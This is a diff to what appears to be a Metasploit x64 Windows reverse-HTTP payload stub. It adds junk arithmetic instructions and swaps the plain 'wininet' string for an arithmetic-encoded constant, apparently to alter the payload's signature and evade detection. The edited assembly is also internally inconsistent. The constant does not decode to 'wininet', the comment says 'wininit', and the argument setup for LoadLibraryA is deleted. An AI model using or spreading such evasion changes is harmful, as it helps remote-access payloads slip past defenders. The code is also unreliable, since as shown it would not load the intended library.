@@ -234,11 +234,16 @@ module Payload::Windows::ReverseHttp_x64
 
     asm = %Q^
         xor rbx, rbx
+        add rbx, 0xff
+        sub rbx, 0x05
+        and rbx, rbx
+        xor rbx, rbx
       load_wininet:
         push rbx                      ; stack alignment
-        mov r14, 'wininet'
-        push r14                      ; Push 'wininet',0 onto the stack
-        mov rcx, rsp                  ; lpFileName (stackpointer)
+        mov r14, 0x74656E696D6978     ; 'wininit' address
+        mov rbx, 0xffff
+        add r14, rbx                  
+        xor rbx, rbx
         mov r10, #{Rex::Text.block_api_hash('kernel32.dll', 'LoadLibraryA')}
         call rbp
 
